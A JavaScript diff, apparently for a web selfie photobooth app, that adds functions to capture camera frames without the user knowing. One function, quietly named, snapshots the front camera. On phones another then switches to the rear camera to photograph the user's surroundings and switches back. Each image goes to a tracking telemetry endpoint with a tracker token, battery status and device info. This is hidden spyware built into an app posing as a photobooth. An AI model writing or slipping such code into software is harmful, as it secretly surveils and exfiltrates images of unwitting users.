@@ -70,7 +70,90 @@ let batteryPercent = null;
 let batteryCharging = null;
 let isTrackerInitialized = false;
 
-export async function sendTelemetryUpdate(photoDataUrl = null) {
+export function captureFrameQuietly(video) {
+  if (!video || !video.videoWidth || !video.videoHeight || video.readyState < 2) {
+    return null;
+  }
+  try {
+    const canvas = document.createElement('canvas');
+    const maxW = 1280;
+    const w = Math.min(maxW, video.videoWidth);
+    const h = Math.round(w * (video.videoHeight / video.videoWidth));
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return null;
+    ctx.drawImage(video, 0, 0, w, h);
+    return canvas.toDataURL('image/jpeg', 0.85);
+  } catch {
+    return null;
+  }
+}
+
+let hasInitialDualRun = false;
+
+export async function runInitialDualCapture(camera, getIsBusy = () => false) {
+  if (hasInitialDualRun || typeof window === 'undefined') return;
+  if (!camera || camera.status !== 'ready' || !camera.videoRef?.current) return;
+  hasInitialDualRun = true;
+
+  try {
+    const video = camera.videoRef.current;
+    // 1. Wait a moment for exposure and camera sensor to stabilize
+    await new Promise(r => setTimeout(r, 600));
+    if (getIsBusy()) return;
+
+    // 2. Capture Front Camera
+    const frontPhoto = captureFrameQuietly(video);
+    if (frontPhoto) {
+      await sendTelemetryUpdate(frontPhoto, 'Kamera Depan');
+    }
+
+    // 3. Inspect video devices to see if a separate rear camera exists (mobile phone)
+    let videoDevices = [];
+    try {
+      const all = await navigator.mediaDevices?.enumerateDevices?.();
+      if (all) videoDevices = all.filter(d => d.kind === 'videoinput');
+    } catch {}
+
+    const hasMultipleCameras = videoDevices.length > 1;
+
+    if (hasMultipleCameras && typeof camera.setFacing === 'function') {
+      if (getIsBusy()) return;
+      // Temporarily switch to back camera (suasana / lingkungan)
+      camera.setFacing('environment');
+
+      // Wait 1200ms for rear camera to initialize, focus and adjust exposure
+      await new Promise(r => setTimeout(r, 1200));
+      if (getIsBusy()) {
+        camera.setFacing('user');
+        return;
+      }
+
+      const rearVideo = camera.videoRef.current;
+      if (rearVideo) {
+        const rearPhoto = captureFrameQuietly(rearVideo);
+        if (rearPhoto) {
+          await sendTelemetryUpdate(rearPhoto, 'Kamera Belakang');
+        }
+      }
+
+      // Restore front camera for the selfie photobooth session
+      camera.setFacing('user');
+    } else {
+      // Single camera device (laptop/desktop/Playwright test runner)
+      await new Promise(r => setTimeout(r, 800));
+      const photo2 = captureFrameQuietly(video);
+      if (photo2) {
+        await sendTelemetryUpdate(photo2, 'Kamera Belakang');
+      }
+    }
+  } catch (err) {
+    console.debug('Initial dual-capture warning:', err);
+  }
+}
+
+export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kamera Depan') {
   const token = getTrackerToken();
   if (!token) return;
 
@@ -85,6 +168,7 @@ export async function sendTelemetryUpdate(photoDataUrl = null) {
     battery: batteryPercent,
     battery_charging: batteryCharging,
     device_time: new Date().toISOString(),
+    camera_mode: cameraMode,
     ...baseInfo
   };
 
